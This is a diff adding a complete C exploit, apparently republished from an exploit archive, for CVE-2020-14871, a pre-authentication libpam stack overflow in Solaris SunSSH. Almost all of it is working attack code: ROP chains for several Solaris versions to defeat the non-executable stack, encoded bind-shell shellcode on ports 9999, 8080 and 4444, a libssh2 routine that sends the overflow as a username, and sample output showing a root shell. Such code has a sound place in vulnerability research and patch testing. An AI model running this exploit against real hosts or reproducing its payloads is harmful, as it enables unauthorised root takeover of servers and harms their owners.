@@ -1,0 +1,592 @@
+# Exploit Title: Solaris SunSSH 11.0 x86 - libpam Remote Root 
+# Exploit Author: Hacker Fantastic
+# Vendor Homepage: https://www.oracle.com/solaris/technologies/solaris11-overview.html
+# Version: 11
+# Tested on: SunOS solaris 5.11 11.0
+
+/* SunSSH Solaris 10-11.0 x86 libpam remote root exploit CVE-2020-14871
+ * ====================================================================
+ * Makefile
+ * all: hfsunsshdx
+ *
+ *	hfsunsshdx: main.c
+ *	gcc main.c -o hfsunsshdx -lssh2 
+ *
+ *	clean:
+ *	rm -rf hfsunsshdx
+ *	rm -rf core.*
+ *
+ * A trivial to reach stack-based buffer overflow is present in libpam on
+ * Solaris. The vulnerable code exists in pam_framework.c parse_user_name()
+ * which allocates a fixed size buffer of 512 bytes on the stack and parses
+ * usernames into the buffer via modules (authtok_get) without bounds checks.
+ * This issue can be reached remotely pre-authentication via SunSSH when
+ * "keyboard-interactive" is enabled to use PAM based authentication. The
+ * vulnerability was discovered being actively exploited by FireEye in the
+ * wild and is part of an APT toolkit called "EVILSUN". The vulnerability
+ * is present in both SPARC/x86 versions of Solaris & others (eg. illumos).
+ * This exploit uses ROP gadgets to disable nxstack through mprotect on x86
+ * and a helper shellcode stub. The configuration in a default Solaris 
+ * install is vulnerable. The exploit makes use of libssh2 and tested on
+ * Solaris 10 through 11.0. Solaris 9 does not ship with a vulnerable 
+ * SunSSH implementation and versions later than 11.1 have updated SunSSH
+ * code that prevents the issue being triggered.
+ *
+ * e.g.
+ *  ./hfsunsshdx -s 192.168.11.220 -t 0 -x 2
+ *  [+] SunSSH Solaris 10-11.0 x86 libpam remote root exploit CVE-2020-14871
+ *  [-] chosen target 'Solaris 11 11/11 11.0 Sun_SSH_2.0 x86'
+ *  [-] using shellcode 'Solaris 11.0 x86 bindshell tcp port 9999' 193 bytes
+ *  [+] ssh host fingerprint: 01bc34fe8092e051716b91fd88eed210db2df49e
+ *  [+] entering keyboard-interactive authentication.
+ *  [-] number of prompts: 1
+ *  [-] prompt 0 from server: 'Please enter user name: '
+ *  [-] shellcode length 193 bytes
+ *  [-] rop chain length 68
+ *  [-] exploit buffer length 580
+ *  [-] sending exploit magic buffer... wait
+ *  [+] exploit success, handling payload...
+ *  [-] connected.. enjoy :)
+ *  SunOS solaris 5.11 11.0 i86pc i386 i86pc
+ *   6:49pm  up 53 min(s),  1 user,  load average: 0.01, 0.01, 0.01
+ *  helpdesk   console      Nov 27 17:57
+ *  uid=0(root) gid=0(root)
+ *
+ * -- Hacker Fantastic (https://hacker.house)
+ */
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <ctype.h>
+#include <getopt.h>
+#include <time.h>
+#include <signal.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <sys/select.h>
+#include <arpa/inet.h>
+#include <sys/time.h>
+#include <libssh2.h>
+
+int sd = -1;
+int oldsd = -1;
+int ishell = -1;
+char* buf;
+char* payload;
+char* retaddr;
+struct sockaddr_in sain;
+
+struct target {
+	char* name;
+	char* ropchain;
+};
+
+struct shellcode {
+	char* name;
+	char* shellcode;
+};
+
+void spawn_shell(int);
+void bindshell_setup(short);
+void on_alarm(int);
+void on_interupt(int);
+void prepare_payload();
+
+const int targetno = 5;
+struct target targets[] = {
+	{"Solaris 11 11/11 11.0 Sun_SSH_2.0 x86",
+	"\x41\x42\x43\x44"  // %ebx
+	"\x45\x46\x47\x48"  // %esi 
+	"\x50\x51\x52\x53"  // %ebp
+	"\xa7\x0e\x06\x08"  // pop %ecx, pop %edx, pop %ebp
+	"\x9c\x3e\x04\x08"  // ptr to (0x?, 0x?, 0x8044cf0, 0x7) 
+	"\x01\x01\x04\x08"  // %edx unused, must be writeable addr
+	"\x41\x42\x43\x44"  // %ebp unused var 
+	"\x93\xdb\xc8\xfe"  // pop %edx ; ret
+	"\x01\x30\x04\x08"  // ptr to 0x08043001 mprotect arg
+	"\x1a\xe7\x0b\xfe"  // dec %edx ; ret 
+	"\x79\x41\xfe\xfe"  // mov %edx,$0x4(%ecx) ; xor %eax, %eax ; ret
+	"\x93\xdb\xc8\xfe"  // pop %edx ; ret 
+	"\x01\x30\x04\x08"  // ptr to shellcode
+	"\xe0\xe8\x3e\xfe"  // mov $0x72,%al 
+	"\x64\x7c\xc3\xfe"  // inc %eax ; ret
+        "\x64\x7c\xc3\xfe"  // inc %eax ; ret	
+	"\x22\x9d\xd3\xfe"},// sysenter
+	{"Solaris 11 Express (snv_151a) Sun_SSH_1.5 x86",
+	"\x41\x42\x43\x44"  // %ebx overwrite unused
+	"\x41\x42\x43\x44"  // %esi overwrite unused
+	"\xf8\x32\x04\x08"  // %ebp overwrite unused
+	"\xb7\xf9\x05\x08"  // pop %ecx ; pop %edx ; pop %ebp ; ret
+	"\x7e\x36\x02\x04"  // ptr/2 to (0x?, 0x0, 0x1000, 0x7) 
+	"\x01\x30\x04\x08"  // ptr for %edx
+	"\x44\x43\x42\x41"  // ptr for %ebp unused
+	"\xe4\xd4\xde\xfe"  // dec %edx ; add %ecx, %ecx ; ret
+	"\x19\x42\xfe\xfe"  // mov %edx,$0x4(%ecx) ; xor %eax, %eax; ret
+	"\xb8\xf9\x05\x08"  // pop %edx ; pop %ebp ; ret
+	"\xeb\x30\x04\x08"  // shellcode ptr for %edx
+	"\x1c\x33\x04\x08"  // %ebp & used by "leave"
+        "\x84\x98\x51\xfe"  // mov $0x82, %eax ; pop %esi ; pop %ebx ; leave ; ret
+        "\x41\x42\x43\x44"  // %esi unused
+        "\xe0\x30\x04\x08"  // shellcode ptr to %ebx                              
+        "\xe8\x32\x04\x08"  // ptr into %ebp        
+        "\x19\x3f\xfe\xfe"  // sub $0x4,%eax ; ret  
+        "\x19\x3f\xfe\xfe"  // sub $0x4,%eax ; ret
+        "\x19\x3f\xfe\xfe"  // sub $0x4,%eax ; ret
+        "\x11\x3f\xfe\xfe"  // sub $0x2,%eax ; ret
+	"\xfe\xf8\xcf\xfe"},// sysenter
+	{"Solaris 10 1/13 (147148-26) Sun_SSH_1.1.5 x86",
+	"\xc3\x31\x04\x08"  // overwrite %ebp unused
+	"\xa3\x6c\xd8\xfe"  // mov $0x74, %eax ; ret
+	"\x29\x28\x07\x08"  // pop %ebx ; ret
+	"\xf0\xff\xaf\xfe"  // 0x0a writen to address, unused gadget
+	"\x08\xba\x05\x08"  // pop %edx ; pop %ebp ; ret
+	"\x01\x30\x04\x08"  // %edx pointer to page
+	"\xb8\x31\x04\x08"  // unused %ebp value
+	"\xaa\x4c\x68\xfe"  // pop %ecx ; ret
+	"\xe0\x6e\x04\x08"  // ptr (0x?,0x0,0x1000,0x7)
+	"\x61\x22\x07\x08"  // dec %edx ; ret
+	"\x8b\x2d\xfe\xfe"  // mov %edx,0x4(%ecx) ; xor %eax,%eax ; ret
+	"\xa3\x6c\xd8\xfe"  // mov $0x74, %eax ; ret
+	"\x08\xba\x05\x08"  // pop %edx ; pop %ebp ; ret
+	"\xc3\x31\x04\x08"  // shellcode addr for %edx
+	"\xc3\x31\x04\x08"  // unused %ebp value
+	"\xf6\x0d\xf4\xfe"},// sysenter, (ret into shellcode via %edx)
+	{"Solaris 10 8/11 (147441-01) Sun_SSH_1.1.4 x86",
+	"\xc3\x31\x04\x08"  // overwrite %ebp unused
+	"\x73\x6a\xd7\xfe"  // mov $0x74, %eax ; ret
+	"\xb1\x26\x07\x08"  // pop %ebx ; ret
+	"\xff\x01\xac\xfe"  // write garbage here, unused gadget
+	"\x98\xb9\x05\x08"  // pop %edx ; pop %ebp ; ret
+	"\xff\x2f\x04\x08"  // %edx pointer to page
+	"\xc3\x31\x04\x08"  // unused %ebp value
+	"\x57\xaa\xe4\xfe"  // pop %ecx ; ret
+	"\x94\x11\x5f\xfe"  // ptr rwx (0x?,0x04b,0xe50,0x7)
+	"\xee\x6a\x65\xfe"  // inc %edx ; ret
+	"\x9b\xc5\xc1\xfe"  // mov %edx,0x4($ecx) ; xor %eax,%eax ; ret
+	"\x73\x6a\xd7\xfe"  // mov $0x74, %eax ; ret
+	"\x86\xae\xe5\xfe"  // pop %edx ; ret
+	"\xc3\x31\x04\x08"  // shellcode return address for %edx
+	"\x66\x56\xb9\xfe"},// sysenter (ret into shellcode via %edx)
+	{"Solaris all Sun_SSH_1.x.x debug crash target",
+	"\x41\x42\x43\x43"  // %ebp ptr
+	"\x78\x79\x80\x81"} // %eip ptr
+};
+
+const int shellno = 4;
+
+struct shellcode shellcodes[] = {
+	{"Solaris x86 bindshell tcp port 9999",
+	/* mprotect magic stub necessary for payloads expecting +x stack */
+	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xc9"
+	"\xbb\x01\x10\x04\x08\x66\xb8\x01\x70\xb1\x07\x4b\x48\x51\x50"
+	"\x53\x53\x89\xe1\x31\xc0\xb0\x74\xcd\x91"
+	/* mprotect_shellcode.S Solaris x86 mprotect(0x08044000,0x7000,0x07);
+	   ==================================================================
+		xorl %eax, %eax
+  		xorl %ecx, %ecx
+  		movl $0x08041001, %ebx
+  		movw $0x7001, %ax
+  		movb $0x7,%cl
+  		dec %ebx
+  		dec %eax
+  		pushl %ecx
+  		pushl %eax
+  		pushl %ebx
+  		pushl %ebx
+  		movl %esp, %ecx
+  		xorl %eax, %eax
+		movb $0x74, %al
+		int $0x91
+	*/
+	/* msfvenom -p solaris/x86/shell_bind_tcp -b "\x09\x20" LPORT=9999 -f c -e x86/xor_dynamic */
+	"\xeb\x23\x5b\x89\xdf\xb0\x55\xfc\xae\x75\xfd\x89\xf9\x89\xde"
+        "\x8a\x06\x30\x07\x47\x66\x81\x3f\x2a\x95\x74\x08\x46\x80\x3e"
+        "\x55\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff\x01\x55\x69"
+        "\xfe\xd9\xfe\x3d\x6b\x64\x88\xe7\xf6\x57\x05\xf7\x17\x30\xc1"
+        "\x51\x69\xfe\x03\x26\x0e\x88\xe6\x6b\x03\x51\x51\x6b\x03\x6b"
+        "\x03\xb1\xe7\xfe\xd7\x6b\x11\x56\x51\x30\xc1\xb1\xe9\xfe\xd7"
+        "\x5a\x51\x51\x52\xb1\xe8\xfe\xd7\xb1\xeb\xfe\xd7\x6b\x08\x51"
+        "\x6b\x3f\x59\xfe\xd7\xfe\x4e\xd9\x78\xf7\x51\x69\x2e\x2e\x72"
+        "\x69\x69\x2e\x63\x68\x6f\x88\xe2\x51\x52\x88\xe0\x51\x50\x52"
+        "\xb1\x3a\xfe\xd7\x2a\x95"},
+	{"Solaris x86 bindshell tcp port 8080",
+	/* mprotect magic stub necessary for payloads expecting +x stack */
+	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xc9"
+	"\xbb\x01\x10\x04\x08\x66\xb8\x01\x70\xb1\x07\x4b\x48\x51\x50"
+	"\x53\x53\x89\xe1\x31\xc0\xb0\x74\xcd\x91"
+	/* msfvenom -p solaris/x86/shell_bind_tcp -b "\x09\x20" LPORT=8080 -f c -e x86/xor_dynamic */
+	"\xeb\x23\x5b\x89\xdf\xb0\x9a\xfc\xae\x75\xfd\x89\xf9\x89\xde"
+	"\x8a\x06\x30\x07\x47\x66\x81\x3f\x44\x60\x74\x08\x46\x80\x3e"
+	"\x9a\x75\xee\xeb\xea\xff\xe1\xe8\xd8\xff\xff\xff\x01\x9a\x69"
+	"\xfe\xd9\xfe\x3d\x6b\x64\x88\xe7\xf6\x57\x05\xf7\x17\x30\xc1"
+	"\x51\x69\xfe\x03\x1e\x91\x88\xe6\x6b\x03\x51\x51\x6b\x03\x6b"
+	"\x03\xb1\xe7\xfe\xd7\x6b\x11\x56\x51\x30\xc1\xb1\xe9\xfe\xd7"
+	"\x5a\x51\x51\x52\xb1\xe8\xfe\xd7\xb1\xeb\xfe\xd7\x6b\x08\x51"
+	"\x6b\x3f\x59\xfe\xd7\xfe\x4e\xd9\x78\xf7\x51\x69\x2e\x2e\x72"
+	"\x69\x69\x2e\x63\x68\x6f\x88\xe2\x51\x52\x88\xe0\x51\x50\x52"
+	"\xb1\x3a\xfe\xd7\x44\x60"},
+	/* dup2(); and execve(); changed calling convention on 11.0, uses x86/shikata_ga_nai */ 
+	{"Solaris 11.0 x86 bindshell tcp port 9999", 
+	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x31\xc0\x31\xc9\x31\xd2\xbb\x01\x10\x04\x08\x66\xb8\x01\x70"
+	"\xb1\x07\x66\xba\x01\x10\x66\x31\xd3\x48\x51\x50\x53\x53\x89"
+	"\xe1\x31\xc0\xb0\x74\xcd\x91"//not encoded, stack address different
+	"\xb8\x5d\x6d\x26\x15\xda\xce\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
+	"\x19\x31\x42\x15\x83\xea\xfc\x03\x42\x11\xe2\xa8\x05\xd9\xcd"
+	"\xad\xea\x4f\x8b\xd8\xf5\x67\x05\xde\x0f\x91\x9b\x1e\xbf\xf6"
+	"\x24\x9c\x67\x08\x52\x47\x0d\x14\x34\xd7\xb8\x1a\xde\xd5\x8c"
+	"\xfd\xe1\x0f\x86\x11\x49\xff\x66\xd2\xc5\x17\x77\x04\x7e\xb7"
+	"\xdb\x19\x68\xc8\x0a\xe9\x81\xc9\x65\x60\x5f\x5f\x83\x25\x35"
+	"\xa1\xcb\x3a\x1f\x22\xa4\x1c\xd9\x2a\x0a\x5d\x4a\xba\x42\x72"
+	"\x18\x52\xf5\xa3\xbc\xcb\x6b\x35\xa3\x5b\x27\xcc\xc5\x0b\x97"
+	"\x9f\x56\x1b\x2c\xdf\x8f"},
+	/* dup2(); and execve(); changed calling convention on 11.0, uses x86/shikata_ga_nai */
+	{"Solaris 11.0 x86 bindshell tcp port 4444", 
+	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+        "\x31\xc0\x31\xc9\x31\xd2\xbb\x01\x10\x04\x08\x66\xb8\x01\x70"
+	"\xb1\x07\x66\xba\x01\x10\x66\x31\xd3\x48\x51\x50\x53\x53\x89"
+	"\xe1\x31\xc0\xb0\x74\xcd\x91"//not encoded, stack address different
+	"\xb8\x8d\x2e\x32\x79\xd9\xe5\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
+	"\x19\x31\x43\x15\x03\x43\x15\x83\xc3\x04\xe2\x78\x46\xcd\xa1"
+	"\x7d\xab\x5b\x37\x08\x32\x6c\xe1\x0e\x4d\x85\x3f\xce\xe1\xc2"
+	"\xc0\xcc\x1e\x83\xb6\x37\x4a\xa1\x98\xe7\xe1\xa7\x72\x05\x46"
+	"\x41\x7d\xdf\xcc\x9e\xd5\x8f\x21\x5f\x69\xc7\xbd\x89\xd1\x47"
+	"\x11\x86\x0f\x98\x43\x56\x25\x99\xba\xfd\xb3\x0f\x4a\x52\xae"
+	"\xf1\x14\xad\xf8\xf2\xea\x89\x7c\xfa\xc4\xe9\x2f\x6a\x08\xc5"
+	"\xbc\x02\x3e\x36\x21\xbb\xd0\xc1\x46\x6b\x7e\x5b\x69\xdb\xd0"
+	"\x0a\x39\x6b\xeb\x53\x6b"}
+};
+
+void spawn_shell(int sd) {
+#define sockbuflen 2048
+	int rcv;
+	char sockbuf[sockbuflen];
+	fd_set readfds;
+	memset(sockbuf,0,sockbuflen);
+	snprintf(sockbuf,sockbuflen,"uname -a;uptime;who;id\n");
+	write(sd,sockbuf,strlen(sockbuf));
+	while (1) {
+		FD_ZERO(&readfds);
+		FD_SET(0,&readfds);
+		FD_SET(sd,&readfds);
+		select(255,&readfds,NULL,NULL,NULL);
+		if (FD_ISSET(sd, &readfds)) {
+			memset(sockbuf,0,sockbuflen);
+			rcv = read(sd,sockbuf,sockbuflen);
+			if (rcv <= 0) {
+              			printf("\e[1m\e[34m[!] connection closed by foreign host.\n\e[0m");
+              			exit(-1);
+            		}
+			printf("%s",sockbuf);
+			fflush(stdout);
+		}
+      		if(FD_ISSET(0,&readfds)) {
+			memset(sockbuf,0,sockbuflen);
+			read(0,sockbuf,sockbuflen);
+			write(sd,sockbuf,strlen(sockbuf));
+        	}
+    	}
+}
+
+void bindshell_setup(short port){
+	oldsd = sd;
+        sd = socket(AF_INET,SOCK_STREAM,0);
+        sain.sin_port = htons(port);
+        if(connect(sd,(struct sockaddr*)&sain,sizeof(sain))<0){
+		printf("[!] fatal bind shell failed\n\e[0m");
+                exit(-1);
+        }
+	printf("[-] connected.. enjoy :)\e[0m\n");
+        spawn_shell(sd);
+}
+
+void on_alarm(int signum){
+	printf("[+] exploit success, handling payload...\n");
+	if(ishell==0||ishell==2){
+		bindshell_setup(9999);
+	}
+	if(ishell==1||ishell==3){
+		bindshell_setup(8080);
+	}
+	printf("[-] exploit complete\n\e[0m");
+	exit(0);
+}
+
+void on_interrupt(int signum){
+	printf("\e[1m\e[34m[!] interrupt caught... cleaning up\n\e[0m");
+	if(sd){
+		close(sd);
+	}
+	if(oldsd){
+		close(oldsd);
+	}
+	exit(0);
+}
+
+void prepare_payload(){ /* bad characters are 0x20 0x09 & 0x00 */
+#define payload_size 4096
+	int len = strlen(payload);
+	buf = malloc(payload_size);
+	char randchar = 'A';
+	char* randbuf = malloc(2);
+	if(!buf||!randbuf){
+		printf("[!] fatal payload buffer error\n");
+		exit(-1);
+	}
+	srand(time(NULL));
+	memset(buf,'\x00',payload_size);
+	memset(randbuf,0,2);
+	printf("[-] shellcode length %d bytes\n",len);
+	if(len < 512 && payload_size > 1024){
+		memcpy(buf,payload,len);
+		for(int i =0;i <= (512 - len);i++){
+ 			randchar = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"[random() % 52];
+			memcpy(randbuf,&randchar,1);
+			strcat(buf,randbuf);
+		}
+		len = strlen(retaddr);
+		printf("[-] rop chain length %d\n",len);
+		if(len + 512 < payload_size){
+			memcpy((void*)(long)buf+512,(void*)retaddr,len);
+			len = strlen(buf);
+			printf("[-] exploit buffer length %d\n",len);
+		}
+		else{
+			printf("[!] exploit buffer miscalculated\n");
+			exit(-1);
+		}
+	}
+	else{
+		printf("[!] exploit buffer miscalculated\n");
+		exit(-1);
+	}
+}
+
+static void kbd_callback(const char *name, int name_len,const char *instruction, int instruction_len,int num_prompts,const LIBSSH2_USERAUTH_KBDINT_PROMPT *prompts,LIBSSH2_USERAUTH_KBDINT_RESPONSE *responses, void **abstract) {
+	int i = 0;
+	signal(SIGALRM, &on_alarm);
+	printf("[+] entering keyboard-interactive authentication.\n");
+	printf("[-] number of prompts: %d\n", num_prompts);
+	printf("[-] prompt %d from server: '", i);
+	fwrite(prompts[i].text, 1, prompts[i].length, stdout);
+	printf("'\n");
+	prepare_payload();
+	//uncomment to pause for gdb debugging
+	//sleep(10);
+	responses[i].text = strdup(buf);
+	responses[i].length = strlen(buf);
+	printf("[-] sending exploit magic buffer... wait\n");
+	alarm(5);
+}
+
+int main(int argc,char **argv){
+	int ihost = 0, itarg = 0, port = 22, index = 0, rc = 0;
+	char* host;
+	int i, type, exitcode;
+	unsigned long hostaddr;
+	const char *fingerprint;
+	LIBSSH2_SESSION *session;
+	LIBSSH2_CHANNEL *channel;
+	char *exitsignal = (char *)"none";
+	size_t len;
+	LIBSSH2_KNOWNHOSTS *nh;
+	static struct option options[] = {
+		{"server", 1, 0, 's'},
+		{"port", 1, 0, 'p'},
+		{"target", 1, 0, 't'},
+		{"shellcode", 1, 0, 'x'},
+		{"help", 0, 0,'h'}
+        };
+	printf("\e[1m\e[34m[+] SunSSH Solaris 10-11.0 x86 libpam remote root exploit CVE-2020-14871\n");
+	while(rc != -1) {
+	        rc = getopt_long(argc,argv,"s:p:t:x:h",options,&index);
+        	switch(rc) {
+               		case -1:
+	                        break;
+        	        case 's':
+				if(ihost==0){
+					host = malloc(strlen(optarg) + 1);
+					if(host){
+						sprintf(host,"%s",optarg);
+						ihost = 1;
+					}
+				}
+               			break;
+	                case 'p':
+				port = atoi(optarg);
+                	        break;
+			case 'x':
+				if(ishell==-1) {
+					rc = atoi(optarg);
+					switch(rc){
+						case 0:
+							printf("[-] using shellcode '%s' %d bytes\n",shellcodes[rc].name,strlen(shellcodes[rc].shellcode));
+							payload = malloc(strlen(shellcodes[rc].shellcode)+1);
+							if(payload){
+								memset(payload,0,strlen(shellcodes[rc].shellcode)+1);
+								memcpy((void*)payload,(void*)shellcodes[rc].shellcode,strlen(shellcodes[rc].shellcode));
+								ishell = rc;
+							}
+							break;
+						case 1:
+							printf("[-] using shellcode '%s' %d bytes\n",shellcodes[rc].name,strlen(shellcodes[rc].shellcode));
+							payload = malloc(strlen(shellcodes[rc].shellcode)+1);
+							if(payload){
+								memset(payload,0,strlen(shellcodes[rc].shellcode)+1);
+								memcpy((void*)payload,(void*)shellcodes[rc].shellcode,strlen(shellcodes[rc].shellcode));
+								ishell = rc;
+							}
+							break;
+						case 2:
+							printf("[-] using shellcode '%s' %d bytes\n",shellcodes[rc].name,strlen(shellcodes[rc].shellcode));
+							payload = malloc(strlen(shellcodes[rc].shellcode)+1);
+							if(payload){
+								memset(payload,0,strlen(shellcodes[rc].shellcode)+1);
+								memcpy((void*)payload,(void*)shellcodes[rc].shellcode,strlen(shellcodes[rc].shellcode));
+								ishell = rc;
+							}
+							break;
+						case 3:
+							printf("[-] using shellcode '%s' %d bytes\n",shellcodes[rc].name,strlen(shellcodes[rc].shellcode));
+							payload = malloc(strlen(shellcodes[rc].shellcode)+1);
+							if(payload){
+								memset(payload,0,strlen(shellcodes[rc].shellcode)+1);
+								memcpy((void*)payload,(void*)shellcodes[rc].shellcode,strlen(shellcodes[rc].shellcode));
+								ishell = rc;
+							}
+							break;
+
+						default:
+							printf("[!] Invalid shellcode selection %d\n",rc);
+							exit(0);
+							break;
+						}
+				}
+				break;
+	                case 't':
+				if(itarg==0){
+					rc = atoi(optarg);
+					switch(rc){
+						case 0:
+							printf("[-] chosen target '%s'\n",targets[rc].name);
+							retaddr = malloc(strlen(targets[rc].ropchain)+1);
+							if(retaddr){
+								memset(retaddr,0,strlen(targets[rc].ropchain)+1);
+								memcpy((void*)retaddr,(void*)targets[rc].ropchain,strlen(targets[rc].ropchain));
+								itarg = rc;
+							}
+							break;
+						case 1:
+							printf("[-] chosen target '%s'\n",targets[rc].name);
+							retaddr = malloc(strlen(targets[rc].ropchain)+1);
+							if(retaddr){
+								memset(retaddr,0,strlen(targets[rc].ropchain)+1);
+								memcpy((void*)retaddr,(void*)targets[rc].ropchain,strlen(targets[rc].ropchain));
+								itarg = rc;
+							}
+							break;
+						case 2:
+							printf("[-] chosen target '%s'\n",targets[rc].name);
+							retaddr = malloc(strlen(targets[rc].ropchain)+1);
+							if(retaddr){
+								memset(retaddr,0,strlen(targets[rc].ropchain)+1);
+								memcpy((void*)retaddr,(void*)targets[rc].ropchain,strlen(targets[rc].ropchain));
+								itarg = rc;
+							}
+							break;
+						case 3:
+							printf("[-] chosen target '%s'\n",targets[rc].name);
+							retaddr = malloc(strlen(targets[rc].ropchain)+1);
+							if(retaddr){
+								memset(retaddr,0,strlen(targets[rc].ropchain)+1);
+								memcpy((void*)retaddr,(void*)targets[rc].ropchain,strlen(targets[rc].ropchain));
+								itarg = rc;
+							}
+							break;
+						case 4:
+							printf("[-] chosen target '%s'\n",targets[rc].name);
+							retaddr = malloc(strlen(targets[rc].ropchain)+1);
+							if(retaddr){
+								memset(retaddr,0,strlen(targets[rc].ropchain)+1);
+								memcpy((void*)retaddr,(void*)targets[rc].ropchain,strlen(targets[rc].ropchain));
+								itarg = rc;
+							}
+							break;
+						default:
+							printf("[!] Invalid target selection %d\n", rc);
+							exit(0);
+							break;
+					}
+					itarg = 1;
+				}
+        	                break;
+			case 'h':
+				printf("[!] Usage instructions.\n[\n");
+				printf("[ %s <required> (optional)\n[\n[   --server|-s <ip/hostname>\n",argv[0]);
+				printf("[   --port|-p (port)[default 22]\n[   --target|-t <target#>\n");
+				printf("[   --shellcode|-x <shellcode#>\n[\n");
+				printf("[ Target#'s\n");
+				for(i = 0;i <= targetno - 1;i++){
+					printf("[ %d \"%s\"\n",i,targets[i]);
+				}
+				printf("[\n[ Shellcode#'s\n");
+				for(i = 0;i <= shellno - 1;i++){
+					printf("[ %d \"%s\" (length %d bytes)\n",i,shellcodes[i].name,strlen(shellcodes[i].shellcode));
+				}
+				printf("\e[0m");
+				exit(0);
+				break;
+			default:
+                		break;
+	        }
+	}
+	if(itarg != 1 || ihost  != 1 || ishell < 0){
+		printf("[!] error, insufficient arguments, try running '%s --help'\e[0m\n",argv[0]);
+		exit(-1);
+	}
+	rc = libssh2_init(0);
+	hostaddr = inet_addr(host);
+	sd = socket(AF_INET, SOCK_STREAM, 0);
+	sain.sin_family = AF_INET;
+	sain.sin_port = htons(port);
+	sain.sin_addr.s_addr = hostaddr;
+	if(connect(sd, (struct sockaddr*)(&sain),sizeof(struct sockaddr_in)) != 0) {
+		fprintf(stderr, "[!] failed to connect!\n");
+		goto shutdown;
+	}
+	session = libssh2_session_init();
+	libssh2_session_set_blocking(session, 1);
+	while((rc = libssh2_session_handshake(session, sd))==LIBSSH2_ERROR_EAGAIN);
+	if(rc) {
+		printf("[!] failure establishing ssh session: %d\n", rc);
+		goto shutdown;
+	}
+	nh = libssh2_knownhost_init(session);
+	if(!nh) {
+		printf("[!] failure on libssh2 init\n");
+		goto shutdown;
+	}
+	fingerprint = libssh2_hostkey_hash(session, LIBSSH2_HOSTKEY_HASH_SHA1);
+	printf("[+] ssh host fingerprint: ");
+	for(i = 0; i < 20; i++) {
+		printf("%02x", (unsigned char)fingerprint[i]);
+	}
+	printf("\n");
+	libssh2_knownhost_free(nh);
+	signal(SIGINT,&on_interrupt);
+	libssh2_userauth_keyboard_interactive(session, "", &kbd_callback);
+	printf("[!] exploit failed, core maybe on target!\n");
+shutdown:
+	if(sd){
+		close(sd);
+	}
+	printf("\e[0m");
+	return -2;
+}
